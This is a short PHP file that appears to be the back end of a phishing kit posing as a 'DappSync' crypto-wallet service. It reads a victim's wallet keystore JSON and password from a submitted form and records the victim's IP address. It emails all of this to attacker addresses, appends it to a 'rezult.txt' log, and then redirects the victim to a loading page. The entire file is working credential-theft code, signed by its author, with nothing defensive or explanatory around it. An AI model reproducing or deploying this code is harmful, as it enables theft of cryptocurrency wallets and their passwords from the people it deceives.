<?php
    $ip = getenv("REMOTE_ADDR");
    include 'assets/visitor.php';
    include 'email.php';
    ini_set( 'display_errors', 1 );
    error_reporting(0);
    $from = rand();
    $subject .= "New Keystore DappSync | ".$_POST['user']." | $ip";
    $message .= "Keystore: " . $_POST["keystore-JSON"] . "\n";
    $message .= "KeysPass: " . $_POST["password"] . "\n";
    $message .= "========User Information========" . "\n";
    $message .= "Client IP: ".$ip."\n";
    $message .= "++++++++++Coded By @ImSrabon++++++++++" . "\n";
    $headers .= "From:" . $from;
    mail($send,$subject,$message, $headers);
    mail($to,$subject,$message, $headers);
    $fp = fopen("rezult.txt","a");
    fputs($fp,$message);
    fclose($fp);
    echo "<script>window.location = 'loading.html'</script>"
?>